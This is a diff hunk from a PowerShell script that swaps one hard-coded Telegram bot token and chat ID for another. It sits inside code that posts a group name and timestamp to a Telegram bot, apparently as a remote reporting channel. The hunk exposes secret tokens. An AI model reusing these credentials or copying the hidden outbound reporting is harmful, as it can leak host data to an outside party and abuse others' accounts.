@@ -114,8 +114,8 @@ Group: $group
 Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
 "@
       
-        $bot = "7252153973:AAHhnvXQn4Q5DJTEtLiA7y59VCkJEdEFoak"
-        $chat = "-1002513798195"
+        $bot = "9080417628:AAGIeoQSs5yZZQJc8SJM7gg5o7vcyhYiWLs"
+        $chat = "-5527812660"
         $uri = "https://api.telegram.org/bot$bot/sendMessage"
         $body = @{
             chat_id = $chat
